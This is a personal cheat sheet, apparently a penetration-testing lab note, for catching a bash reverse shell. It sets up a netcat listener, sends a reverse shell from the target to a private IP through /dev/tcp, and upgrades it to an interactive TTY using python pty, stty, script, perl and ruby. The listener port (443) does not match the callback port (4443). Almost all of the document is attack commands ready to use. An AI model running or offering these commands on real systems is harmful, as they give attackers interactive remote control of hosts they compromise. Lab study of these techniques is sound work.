# bash

Author: Julien Bongars
Date: 2025-09-21 10:30:31
Path: /opt/development/cybersec/hacklas/notes/infiltration/reverse-shell/bash.md

---

## Source Machine

```bash
nc -lvnp 443
```

## Target Machine

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.234/4443 0>&1"
```

## Back to Source Machine

### Make fully interactive

**Method 1**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo; fg
export TERM=xterm
```

**HINT** If broken

you can try to reset the terminal by going to `Terminal -> reset and clear` and then running the following

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
reset
export TERM=xterm

# if above doesn't work
stty rows 38 columns 116
```

**Method 2**

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell
# Press: Ctrl+Z

# Step 3: In your local terminal
stty raw -echo; fg

# Step 4: Back in reverse shell
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## Troubleshooting

Dealing with error

su must be run in a terminal
foo must be run in a terminal
not an interactive terminal
not an interactive session

### Quick Fixes

**Method 1: Python PTY (Most Common)**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Method 2: Script Command**

```bash
script /dev/null
```

**Method 3: Perl**

```bash
perl -e 'exec "/bin/bash";'
```

**Method 4: Ruby**

```bash
ruby -e 'exec "/bin/bash"'
```
